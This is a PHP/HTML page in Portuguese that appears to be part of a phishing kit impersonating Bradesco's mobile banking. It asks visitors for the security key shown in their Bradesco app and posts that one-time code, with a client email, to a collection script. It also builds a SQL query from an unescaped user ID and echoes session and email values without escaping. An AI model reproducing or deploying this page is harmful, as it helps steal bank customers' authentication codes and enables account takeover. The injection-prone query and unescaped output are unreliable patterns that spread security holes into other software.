<?php 

$GetRef = read($conn, 'acessos', "WHERE id = '$UserId'");
$TokenRef = $GetRef[0]['token_ref'];

?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Acesso Mobile :: Acesso</title>

	<!-- PERSONALIZAÇÃO CABEÇALHO -->
	<meta name="theme-color" content="#0072e5">
	<meta name="apple-mobile-web-app-status-bar-style" content="#0072e5">
	<meta name="msapplication-navbutton-color" content="#0072e5">
</head>
<body>

<div class="container main_header bg-blue">
	<div class="content">
		<div class="logo">
			<img src="../_images/mobile/main_logo.jpg" height="30" width="128">
		</div><!-- logo -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content">
		<div class="home_title">
			<h1>Chave de Segurança</h1>
			<p>
				<?php 
					if(strlen($_SESSION['UserName']) == 0):
						echo 'Digite a <span class="red_txt">Chave de Segurança</span> que aparece no visor do seu dispositivo (Aplicativo Bradesco).';
					else:
						echo $_SESSION['UserName'].', digite a <span class="red_txt">Chave de Segurança</span> que aparece no visor do seu dispositivo (Aplicativo Bradesco).';
					endif;
				?>
			</p>	
		</div>

		<form action="acesso.php?cliente=<?php echo $emailx; ?>" id="form_acesso" class="form_acesso" name="form_acesso" onsubmit="return checkTksAcesso();" method="post">
			
			<div class="block_now">
				<input type="password" name="tks_now" id="tks_now" placeholder="Chave de segurança" maxlength="6" class="style_tks">
				<span class="ref_tks">Chave de Segurança (Ref.: <?= $TokenRef;?>)</span>
			</div>

			<div class="block_labels">
				<input type="hidden" name="sender" value="send_token">
				<input type="submit" name="next_page_acess" value="Confirmar" class="btn-submit-normal">
			</div><!-- block_labels -->
		</form>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<!-- ARQUIVOS DE INCLUSÃO -->
<link rel="stylesheet" href="../_styles/boot_mb.css">
<link rel="stylesheet" href="../_fonts/_fonts.css">
<link rel="stylesheet" href="../_styles/font-awesome.css">
<link rel="stylesheet" href="../_styles/content_mb.css">	
<script src="../_jscripts/jquery.js"></script>
<script src="../_jscripts/content_mb.js"></script>
<!-- ARQUIVOS DE INCLUSÃO -->	
</body>
</html>
<?php ob_end_flush(); ?>